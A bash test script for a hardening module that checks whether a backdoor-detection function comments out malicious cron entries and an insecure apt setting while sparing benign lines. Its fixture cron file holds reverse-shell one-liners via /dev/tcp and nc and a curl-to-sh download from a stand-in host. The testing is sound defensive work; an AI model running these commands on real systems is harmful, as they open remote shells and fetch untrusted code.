#!/bin/bash
set -euo pipefail
ROOT=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)
TEST_DIR=$(mktemp -d)
trap 'rm -rf -- "$TEST_DIR"' EXIT
source "$ROOT/modules/extra_hardening.sh"
backup_file() { return 0; }
cat > "$TEST_DIR/cron" <<'CRON'
# bash -i >& /dev/tcp/1.2.3.4/9 0>&1 (already a comment)
0 * * * * root /usr/bin/apt-get update
* * * * * root bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
*/5 * * * * root curl http://x.example/a.sh | sh
@reboot root nc -e /bin/sh 10.0.0.5 9
0 3 * * * root nice -n 5 find /tmp -mtime +7
CRON
extra_comment_matching "$TEST_DIR/cron" "$BACKDOOR_REGEX" "test"
[[ "$(grep -c 'cp-removed' "$TEST_DIR/cron")" == 3 ]]
grep -q '^0 \* \* \* \* root /usr/bin/apt-get update' "$TEST_DIR/cron"
grep -q '^0 3 \* \* \* root nice' "$TEST_DIR/cron"
[[ "$(head -1 "$TEST_DIR/cron")" == '# bash -i >& /dev/tcp/1.2.3.4/9 0>&1 (already a comment)' ]]
before=$(md5sum < "$TEST_DIR/cron")
extra_comment_matching "$TEST_DIR/cron" "$BACKDOOR_REGEX" "test"
[[ "$before" == "$(md5sum < "$TEST_DIR/cron")" ]]
printf 'Acquire::AllowInsecureRepositories "true";\nAPT::Get::Assume-Yes "true";\n' > "$TEST_DIR/apt"
extra_comment_matching "$TEST_DIR/apt" 'AllowUnauthenticated|AllowInsecureRepositories' "apt"
grep -q '^# \[cp-removed\] Acquire::AllowInsecure' "$TEST_DIR/apt"
grep -q '^APT::Get::Assume-Yes' "$TEST_DIR/apt"
README_DATA='{"critical_services":["ssh","xrdp"]}'
extra_is_critical xrdp
if extra_is_critical telnet; then echo 'FAIL: non-critical treated as critical'; exit 1; fi
echo 'PASS: backdoor/apt line neutralization is idempotent and spares benign lines; critical services respected'
